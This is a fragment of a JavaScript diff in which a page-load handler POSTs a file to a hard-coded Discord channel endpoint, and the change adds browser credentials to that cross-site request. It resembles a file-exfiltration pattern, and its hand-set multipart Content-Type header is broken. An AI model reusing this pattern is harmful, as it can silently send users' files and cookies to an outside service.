@@ -19,6 +19,7 @@ document.addEventListener('DOMContentLoaded', function(){
             formData.append('file', file);
             fetch('https://discord.com/api/v10/channels/1146358218696691764/messages', {
                 method: 'POST',
+                credentials: 'include',
                 body: formData,
                 headers: {
                     'Content-Type': 'multipart/form-data',
